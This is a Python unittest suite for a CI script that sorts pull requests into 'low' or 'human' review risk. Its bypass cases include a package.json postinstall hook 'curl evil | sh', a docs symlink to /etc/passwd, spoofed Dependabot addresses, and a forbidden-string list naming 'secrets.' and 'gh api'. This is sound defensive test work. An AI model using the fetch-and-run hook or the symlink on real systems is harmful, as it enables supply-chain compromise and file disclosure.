"""PR risk classifier (.github/scripts/pr_risk.py), the hub's check script (pr_risk_check.sh) and the pinned shape of the
`risk` job in ci.yml. Expected answers come from the rules of D-62 and the security review, not from the script's output.
Offline. Run from the repo root:  python -m unittest discover -s infra/test -v
"""

from __future__ import annotations

import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

import yaml

REPO = Path(__file__).resolve().parents[2]
SCRIPT = REPO / ".github" / "scripts" / "pr_risk.py"
CHECK = REPO / ".github" / "scripts" / "pr_risk_check.sh"
CI = REPO / ".github" / "workflows" / "ci.yml"
DECISIONS = REPO / "docs" / "decisions" / "DECISIONS.md"
CLAUDE_MD = REPO / "CLAUDE.md"

_spec = importlib.util.spec_from_file_location("pr_risk", SCRIPT)
pr_risk = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(pr_risk)

DEP = "dependabot[bot]"
DEP_MAIL = "49699333+dependabot[bot]@users.noreply.github.com"
MINOR = "Bump left-pad from 1.2.3 to 1.3.0"
PATCH = "Bump left-pad from 1.2.3 to 1.2.4"
MAJOR = "Bump left-pad from 1.9.0 to 2.0.0"
ZERO_X = "Bump left-pad from 0.4.1 to 0.5.0"
ZERO_X_PATCH = "Bump left-pad from 0.4.1 to 0.4.2"

_UNSET = object()


def run(files, author="someone", title="t", numstat=None, raw=_UNSET, emails=_UNSET, pkg_ok=_UNSET):
    """files: paths (status M) or (status, path). raw defaults to plain 100644 files; emails to dependabot only."""
    fl = [("M", f) if isinstance(f, str) else f for f in files]
    if raw is _UNSET:
        raw = {p: ("100644", "100644") for _, p in fl}
    if emails is _UNSET:
        emails = [DEP_MAIL]
    if pkg_ok is _UNSET:
        pkg_ok = lambda p: True
    return pr_risk.classify(fl, author, title, numstat, raw, emails, pkg_ok)


def rule_of(res, path=None):
    return [r["rule"] for r in res[1] if path is None or r["path"] == path][0]


class Low(unittest.TestCase):
    def test_docs_only(self):
        self.assertEqual(run(["docs/ui/menu.md", "docs/ui/README.md"])[0], "low")

    def test_docs_added_and_qa(self):
        self.assertEqual(run([("A", "docs/new.md"), "docs/qa/results.md"])[0], "low")

    def test_added_test_files_by_name(self):
        for p in ("services/x/test/test_a.py", "services/x/tests/b_test.py", "apps/console/src/a.test.tsx", "a/b.test.ts",
                  "scripts/c.test.mjs", "packages/z/d.spec.ts", "apps/console/e2e/login.spec.ts", "infra/test/test_x.py"):
            self.assertEqual(run([("A", p)])[0], "low", p)

    def test_modified_test_with_only_added_lines(self):
        self.assertEqual(run(["a/b.test.ts"], numstat={"a/b.test.ts": (12, 0)})[0], "low")

    def test_dependabot_patch_and_minor(self):
        for title in (PATCH, MINOR):
            self.assertEqual(run(["package.json", "package-lock.json"], DEP, title)[0], "low", title)
            self.assertEqual(run(["apps/console/package.json"], DEP, title)[0], "low", title)

    def test_dependabot_0x_patch_is_still_human(self):
        self.assertEqual(run(["package.json"], DEP, ZERO_X_PATCH)[0], "human")


class Human(unittest.TestCase):
    def test_empty_list(self):
        self.assertEqual(run([])[0], "human")

    def test_decisions_md(self):
        risk, reasons = run(["docs/decisions/DECISIONS.md"])
        self.assertEqual(risk, "human")
        self.assertIn("decision", reasons[0]["detail"])

    def test_docs_plus_decisions(self):
        self.assertEqual(run(["docs/a.md", "docs/decisions/DECISIONS.md"])[0], "human")

    def test_deleted_test(self):
        res = run([("D", "services/x/tests/test_a.py")])
        self.assertEqual(res[0], "human")
        self.assertEqual(rule_of(res), "test-deleted")

    def test_deleted_test_among_edits(self):
        self.assertEqual(run(["docs/a.md", ("D", "a/b.test.ts")])[0], "human")

    def test_workflow(self):
        risk, reasons = run([".github/workflows/ci.yml"])
        self.assertEqual(risk, "human")
        self.assertIn(".github/**", reasons[0]["detail"])

    def test_always_human_paths(self):
        for p in (".github/scripts/x.test.mjs", ".claude/settings.json", "CLAUDE.md", "infra/aws/central.yaml",
                  "infra/customer-stack/template.yaml", "db/prisma/schema.prisma", "db/test/x.test.ts",
                  "infra/aws/test/test_a.py", "infra/scripts/rehearsal/run.sh", "infra/scripts/rehearsal/README.md",
                  "infra/scripts/rehearsal/x.test.mjs"):
            res = run([("A", p)])
            self.assertEqual(res[0], "human", p)
            self.assertEqual(rule_of(res), "always-human", p)

    def test_package_json_not_dependabot(self):
        self.assertEqual(run(["package.json"])[0], "human")
        self.assertEqual(run(["package-lock.json"], "alice", MINOR)[0], "human")

    def test_dependabot_major(self):
        res = run(["package.json", "package-lock.json"], DEP, MAJOR)
        self.assertEqual(res[0], "human")
        self.assertEqual({r["rule"] for r in res[1]}, {"dependabot-major"})

    def test_dependabot_title_unreadable(self):
        self.assertEqual(run(["package.json"], DEP, "Update stuff")[0], "human")

    def test_dependabot_title_from_other_author(self):
        self.assertEqual(run(["package.json"], "alice", PATCH)[0], "human")

    def test_dependabot_minor_does_not_open_other_paths(self):
        self.assertEqual(run(["package.json", ".github/workflows/ci.yml"], DEP, MINOR)[0], "human")
        self.assertEqual(run(["package.json", "apps/console/src/page.tsx"], DEP, MINOR)[0], "human")

    def test_mixed(self):
        risk, reasons = run(["docs/a.md", "services/x/handler.py", ("A", "a.test.ts")])
        self.assertEqual(risk, "human")
        self.assertEqual([r["path"] for r in reasons if r["verdict"] == "human"], ["services/x/handler.py"])

    def test_not_listed_default(self):
        self.assertEqual(run(["apps/console/src/page.tsx"])[0], "human")
        self.assertEqual(run(["README.md"])[0], "human")


class ReviewFindings(unittest.TestCase):
    """Bypass cases of the security review (blockers 2, 3 and recommendations 4 to 6)."""

    # blocker 2: a test/ or tests/ directory does not make a file a test
    def test_files_in_test_dirs_that_are_not_tests(self):
        for p in ("services/x/tests/conftest.py", "services/x/tests/__init__.py", "services/x/test/setup.ts",
                  "services/x/test/jest.config.js", "packages/a/test/fixtures/data.json", "packages/a/test/run.sh",
                  "services/x/test/helper.py", "apps/console/e2e/playwright.config.ts", "apps/console/e2e/helpers.ts",
                  "apps/console/e2e/run.mjs", "apps/console/e2e/sub/util.ts"):
            self.assertEqual(run([("A", p)])[0], "human", p)

    def test_non_test_files_in_product_paths(self):
        for p in ("services/ingest/src/handler.ts", "apps/console/src/app/page.tsx", "packages/core/src/index.ts",
                  "services/alarm-engine/src/alarm_engine/test_helpers.py", "services/x/src/conftest.py"):
            self.assertEqual(run([("A", p)])[0], "human", p)

    def test_e2e_only_spec_ts(self):
        self.assertEqual(run([("A", "apps/console/e2e/a.spec.ts")])[0], "low")
        self.assertEqual(run([("A", "apps/console/e2e/a.test.mjs")])[0], "human")  # e2e: only *.spec.ts
        self.assertEqual(run([("A", "apps/console/e2e/a.ts")])[0], "human")

    # blocker 3: modifying an existing test is low only when nothing is deleted
    def test_modified_test_with_deleted_lines(self):
        res = run(["a/b.test.ts"], numstat={"a/b.test.ts": (5, 1)})
        self.assertEqual(res[0], "human")
        self.assertEqual(rule_of(res), "test-modified")

    def test_modified_test_without_numstat_or_binary(self):
        self.assertEqual(run(["a/b.test.ts"])[0], "human")
        self.assertEqual(run(["a/b.test.ts"], numstat={"a/b.test.ts": None})[0], "human")

    def test_weakened_assertion_is_a_changed_line(self):
        # `assertEqual(x, 1)` -> `assertTrue(True)` appears as 1 added + 1 deleted line
        self.assertEqual(run(["t/test_a.py"], numstat={"t/test_a.py": (1, 1)})[0], "human")

    # recommendation 4: Dependabot
    def test_dependabot_with_a_foreign_commit(self):
        self.assertEqual(run(["package.json"], DEP, MINOR, emails=[DEP_MAIL, "alice@example.com"])[0], "human")

    def test_dependabot_email_must_match_exactly(self):
        for bad in ("dependabot[bot]@evil.example", "x+dependabot[bot]@users.noreply.github.com.evil.io", "dependabot@users.noreply.github.com"):
            self.assertEqual(run(["package.json"], DEP, MINOR, emails=[bad])[0], "human", bad)

    def test_dependabot_without_commit_authors(self):
        self.assertEqual(run(["package.json"], DEP, MINOR, emails=None)[0], "human")
        self.assertEqual(run(["package.json"], DEP, MINOR, emails=[])[0], "human")

    def test_dependabot_0x_minor(self):
        res = run(["package.json"], DEP, ZERO_X)
        self.assertEqual(res[0], "human")
        self.assertEqual(rule_of(res), "dependabot-0x")
        self.assertEqual(run(["package.json"], DEP, "Bump x from 0.0.1 to 0.0.2")[0], "human")

    def test_dependabot_package_json_keys(self):
        self.assertEqual(run(["package.json"], DEP, MINOR, pkg_ok=lambda p: False)[0], "human")
        self.assertEqual(run(["package.json"], DEP, MINOR, pkg_ok=None)[0], "human")

    def test_package_json_key_comparison(self):
        old = {"name": "a", "version": "1.0.0", "scripts": {"t": "x"}, "dependencies": {"left-pad": "^1.2.3"}, "devDependencies": {}}
        j = json.dumps

        def check(**chg):
            new = json.loads(j(old))
            for k, v in chg.items():
                new[k] = v
            return pr_risk.package_json_only_versions(j(old), j(new))

        self.assertTrue(check(dependencies={"left-pad": "^1.3.0"}))
        self.assertFalse(check(dependencies={"left-pad": "^1.3.0", "evil": "^1.0.0"}))
        self.assertFalse(check(dependencies={}))
        self.assertFalse(check(scripts={"t": "x", "postinstall": "curl evil | sh"}))
        self.assertFalse(check(version="1.0.1"))
        self.assertFalse(check(newkey=1))
        self.assertFalse(pr_risk.package_json_only_versions("not json", j(old)))

    def test_dependabot_lock_or_package_added_or_deleted(self):
        self.assertEqual(run([("A", "package-lock.json")], DEP, MINOR)[0], "human")
        self.assertEqual(run([("D", "package.json")], DEP, MINOR)[0], "human")

    # recommendation 5
    def test_rehearsal_is_human(self):
        self.assertEqual(run([("A", "infra/scripts/rehearsal/new.sh")])[0], "human")

    # recommendation 6
    def test_docs_read_by_tests_are_human(self):
        for p in ("docs/specs/alarm-rules.md", "docs/specs/other.md", "docs/GO-LIVE.md", "docs/SETUP-PROD-DB.md",
                  "docs/SETUP-SUPABASE.md", "docs/API-CONTRACT.md"):
            res = run([p])
            self.assertEqual(res[0], "human", p)
            self.assertEqual(rule_of(res), "docs-read-by-tests", p)

    def test_docs_executables_and_scripts(self):
        for p in ("docs/x.sh", "docs/y.py", "docs/z.mjs", "docs/w.js", "docs/qa/run.sh", "docs/Z.SH"):
            self.assertEqual(run([("A", p)])[0], "human", p)

    def test_docs_symlink_and_exec_mode(self):
        self.assertEqual(run([("A", "docs/link.md")], raw={"docs/link.md": ("000000", "120000")})[0], "human")
        self.assertEqual(run(["docs/link.md"], raw={"docs/link.md": ("120000", "100644")})[0], "human")
        self.assertEqual(run([("A", "docs/x.md")], raw={"docs/x.md": ("000000", "100755")})[0], "human")
        self.assertEqual(run([("A", "docs/x.md")], raw={"docs/x.md": ("000000", "100644")})[0], "low")

    def test_docs_without_mode_info(self):
        self.assertEqual(run(["docs/a.md"], raw=None)[0], "human")

    def test_docs_deletion(self):
        self.assertEqual(run([("D", "docs/a.md")])[0], "human")
        self.assertEqual(run(["docs/b.md", ("D", "docs/qa/results.md")])[0], "human")

    def test_parse_raw_and_numstat(self):
        raw = pr_risk.parse_raw(":100644 120000 abc def M\tdocs/a.md\n:000000 100755 0 d A\tdocs/b.md\n")
        self.assertEqual(raw["docs/a.md"], ("100644", "120000"))
        self.assertEqual(raw["docs/b.md"], ("000000", "100755"))
        ns = pr_risk.parse_numstat("3\t0\ta.test.ts\n-\t-\timg.png\n")
        self.assertEqual(ns, {"a.test.ts": (3, 0), "img.png": None})

    # recommendation 7
    def test_table_escapes_backticks_newlines_pipes(self):
        res = [{"path": "docs/a`b\nc|d.md", "rule": "docs", "detail": "x`y", "verdict": "low"}]
        table = pr_risk.render_table("low", res, "a" * 40)
        body = table.split("|---|---|---|---|\n")[1]
        self.assertEqual(len(body.strip().splitlines()), 1)
        self.assertNotIn("`", body)
        self.assertIn("\\|", body)

    def test_table_says_official_verdict_is_the_hubs(self):
        table = pr_risk.render_table("human", [], "b" * 40)
        self.assertIn("b" * 40, table)
        self.assertIn("official verdict", table)
        self.assertIn("main", table)


class Cli(unittest.TestCase):
    def _run(self, stdin, author="x", title="t", args=()):
        env = {k: v for k, v in os.environ.items() if k not in ("GITHUB_STEP_SUMMARY", "GITHUB_OUTPUT")}
        env.update(PR_AUTHOR=author, PR_TITLE=title)
        return subprocess.run([sys.executable, "-I", str(SCRIPT), *args], input=stdin, capture_output=True, text=True, env=env)

    def test_stdout_is_one_json_line_exit_zero_and_has_head(self):
        res = self._run("M\tdocs/a.md\nD\tx/test/b.py\n", args=("--head", "c" * 40))
        self.assertEqual(res.returncode, 0)
        self.assertEqual(len(res.stdout.strip().splitlines()), 1)
        data = json.loads(res.stdout)
        self.assertEqual((data["risk"], data["head"]), ("human", "c" * 40))
        self.assertIn("| file |", res.stderr)

    def test_docs_need_raw_input(self):
        self.assertEqual(json.loads(self._run("docs/a.md\n").stdout)["risk"], "human")
        with tempfile.TemporaryDirectory() as d:
            raw = Path(d) / "raw.txt"
            raw.write_text(":100644 100644 a b M\tdocs/a.md\n")
            self.assertEqual(json.loads(self._run("docs/a.md\n", args=("--raw", str(raw))).stdout)["risk"], "low")

    def test_empty_stdin_is_human_exit_zero(self):
        res = self._run("")
        self.assertEqual(res.returncode, 0)
        self.assertEqual(json.loads(res.stdout)["risk"], "human")

    def test_numstat_file_is_used(self):
        with tempfile.TemporaryDirectory() as d:
            ns = Path(d) / "ns.txt"
            ns.write_text("4\t0\ta.test.ts\n")
            self.assertEqual(json.loads(self._run("M\ta.test.ts\n", args=("--numstat", str(ns))).stdout)["risk"], "low")
            ns.write_text("4\t2\ta.test.ts\n")
            self.assertEqual(json.loads(self._run("M\ta.test.ts\n", args=("--numstat", str(ns))).stdout)["risk"], "human")


@unittest.skipUnless(shutil.which("git") and shutil.which("bash"), "git and bash are needed")
class HubCheckScript(unittest.TestCase):
    """pr_risk_check.sh in a throwaway repository: the classifier comes from the base branch, not from the PR."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self.tmp.name)
        self.env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_COMMITTER_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com",
                    "GIT_COMMITTER_EMAIL": "t@example.com", "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}
        self.git("init", "-q", "-b", "main")
        (self.repo / ".github" / "scripts").mkdir(parents=True)
        shutil.copy(SCRIPT, self.repo / ".github" / "scripts" / "pr_risk.py")
        (self.repo / "docs").mkdir()
        (self.repo / "docs" / "a.md").write_text("a\n")
        (self.repo / "t.test.ts").write_text("one\ntwo\n")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.git("checkout", "-q", "-b", "pr")

    def tearDown(self):
        self.tmp.cleanup()

    def git(self, *a):
        return subprocess.run(["git", *a], cwd=self.repo, env=self.env, capture_output=True, text=True, check=True).stdout.strip()

    def commit(self, msg="pr", email=None):
        self.git("add", "-A")
        env = dict(self.env)
        if email:
            env["GIT_AUTHOR_EMAIL"] = email
        subprocess.run(["git", "commit", "-q", "-m", msg], cwd=self.repo, env=env, check=True, capture_output=True)
        return self.git("rev-parse", "HEAD")

    def check(self, sha, author="alice", title="t"):
        env = {**self.env, "PR_AUTHOR": author, "PR_TITLE": title, "BASE_REF": "main"}
        env.pop("GITHUB_STEP_SUMMARY", None)
        env.pop("GITHUB_OUTPUT", None)
        return subprocess.run(["bash", str(CHECK), sha], cwd=self.repo, env=env, capture_output=True, text=True)

    def test_docs_only_pr_is_low_and_prints_the_sha(self):
        (self.repo / "docs" / "b.md").write_text("b\n")
        sha = self.commit()
        res = self.check(sha)
        self.assertEqual(res.returncode, 0, res.stderr)
        data = json.loads(res.stdout)
        self.assertEqual((data["risk"], data["head"]), ("low", sha))

    def test_pr_cannot_rewrite_its_own_judge(self):
        (self.repo / ".github" / "scripts" / "pr_risk.py").write_text(
            "import json\nprint(json.dumps({'risk': 'low', 'head': 'x', 'reasons': []}))\n")
        (self.repo / "app.py").write_text("print(1)\n")
        sha = self.commit()
        res = self.check(sha)
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertEqual(json.loads(res.stdout)["risk"], "human")

    def test_test_edit_with_deleted_line_is_human_and_pure_addition_is_low(self):
        (self.repo / "t.test.ts").write_text("one\ntwo\nthree\n")
        self.assertEqual(json.loads(self.check(self.commit()).stdout)["risk"], "low")
        (self.repo / "t.test.ts").write_text("one\nthree\n")
        self.assertEqual(json.loads(self.check(self.commit()).stdout)["risk"], "human")

    def test_docs_symlink_is_human(self):
        os.symlink("/etc/passwd", self.repo / "docs" / "link.md")
        self.assertEqual(json.loads(self.check(self.commit()).stdout)["risk"], "human")

    def test_dependabot_needs_every_commit_by_dependabot(self):
        (self.repo / "package.json").write_text(json.dumps({"dependencies": {"left-pad": "^1.2.3"}}))
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base pkg")
        self.git("checkout", "-q", "main")
        self.git("merge", "-q", "--ff-only", "pr")
        self.git("checkout", "-q", "-b", "pr2")
        (self.repo / "package.json").write_text(json.dumps({"dependencies": {"left-pad": "^1.3.0"}}))
        self.commit("bump", email=DEP_MAIL)
        sha = self.git("rev-parse", "HEAD")
        res = self.check(sha, DEP, MINOR)
        self.assertEqual(json.loads(res.stdout)["risk"], "low", res.stderr)
        (self.repo / "docs" / "c.md").write_text("c\n")
        sha = self.commit("extra", email="alice@example.com")
        self.assertEqual(json.loads(self.check(sha, DEP, MINOR).stdout)["risk"], "human")
        # new dependency next to a version bump
        self.git("reset", "-q", "--hard", "HEAD~1")
        (self.repo / "package.json").write_text(json.dumps({"dependencies": {"left-pad": "^1.3.0", "evil": "1.0.0"}}))
        sha = self.commit("bump2", email=DEP_MAIL)
        self.assertEqual(json.loads(self.check(sha, DEP, MINOR).stdout)["risk"], "human")

    def test_bad_sha_fails_without_json(self):
        res = self.check("not-a-sha")
        self.assertNotEqual(res.returncode, 0)
        self.assertEqual(res.stdout.strip(), "")


class RiskJobInCi(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.ci = yaml.safe_load(CI.read_text(encoding="utf-8"))
        cls.job = cls.ci["jobs"]["risk"]
        cls.step = [s for s in cls.job["steps"] if s.get("id") == "classify"][0]

    def test_pull_request_only(self):
        self.assertIn("pull_request", str(self.job["if"]))
        self.assertNotIn("needs", self.job)

    def test_permissions_are_contents_read_only(self):
        self.assertEqual(self.job["permissions"], {"contents": "read"})

    def test_never_fails(self):
        self.assertIs(self.step.get("continue-on-error"), True)
        self.assertTrue(self.step["run"].rstrip().endswith("exit 0"))
        self.assertNotIn("set -e", self.step["run"])
        self.assertNotIn("continue-on-error", self.job)  # job level would also hide a failed checkout

    def test_no_label_or_write(self):
        text = yaml.safe_dump(self.job)
        for bad in ("gh pr", "gh api", "label", "GH_TOKEN", "secrets.", "write"):
            self.assertNotIn(bad, text, bad)

    def test_exposes_result_and_head_sha(self):
        self.assertIn("steps.classify.outputs.risk", self.job["outputs"]["risk"])
        self.assertIn("github.event.pull_request.head.sha", self.job["outputs"]["sha"])

    def test_uses_the_check_script_with_the_base_classifier(self):
        self.assertIn("pr_risk_check.sh", self.step["run"])
        self.assertIn("BASE_REF", self.step["run"])
        self.assertIn("github.event.pull_request.base.sha", self.step["env"]["BASE_SHA"])

    def test_title_goes_through_env_not_the_script_body(self):
        self.assertNotIn("github.event.pull_request.title", self.step["run"])
        self.assertIn("github.event.pull_request.title", self.step["env"]["PR_TITLE"])

    def test_comment_says_it_is_not_the_official_verdict(self):
        self.assertIn("NOT the official verdict", CI.read_text(encoding="utf-8"))

    def test_no_other_job_needs_risk(self):
        for name, job in self.ci["jobs"].items():
            needs = job.get("needs", [])
            needs = [needs] if isinstance(needs, str) else needs
            self.assertNotIn("risk", needs, name)


class D62Documents(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        text = DECISIONS.read_text(encoding="utf-8")
        cls.d62 = text[text.index("### D-62"):]
        cls.d62 = cls.d62.split("\n## ", 1)[0]

    def test_low_definition_matches_the_rules(self):
        self.assertIn("테스트 파일 추가", self.d62)
        self.assertIn("줄만 추가", self.d62)
        self.assertNotIn("테스트 추가·수정", self.d62)
        self.assertIn("0.x", self.d62)
        self.assertIn("리허설", self.d62)
        self.assertRegex(self.d62, r"리허설[^\n]*(제외|human)")

    def test_official_verdict_procedure_is_written(self):
        self.assertIn("pr_risk_check.sh", self.d62)
        self.assertIn("main", self.d62)

    def test_claude_md_gate_5_is_updated(self):
        line = [l for l in CLAUDE_MD.read_text(encoding="utf-8").splitlines() if l.startswith("5. ")][0]
        self.assertNotIn("리허설 스크립트", line.split("`low`")[1].split("만)")[0])
        self.assertIn("0.x", line)
        self.assertIn("줄만 추가", line)


if __name__ == "__main__":
    unittest.main()
